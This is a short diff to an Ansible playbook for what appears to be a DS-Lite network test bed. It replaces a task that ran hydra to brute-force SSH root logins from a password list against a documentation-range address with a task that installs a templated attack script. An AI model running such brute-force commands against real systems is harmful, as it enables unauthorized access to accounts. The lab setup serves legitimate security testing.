@@ -124,8 +124,11 @@
      args:
        chdir: /root/hydra
 
-   - name: Brute-Force the target with list of passwords.
+
+   - name: Create hydra attack script 
      tags: attack-2
-     shell: hydra -s 22 -V -l root -P /root/DS-Lite_Test_Bed/files/pw-list.txt -t 10 -f 2001:db8:0:1::1 ssh
-     args:
-       chdir: /root/hydra
+     ansible.builtin.template:
+       src: /root/DS-Lite_Test_Bed/files/attack-2.txt
+       dest: /root/attack-2.sh
+       owner: root
+       mode: '755'
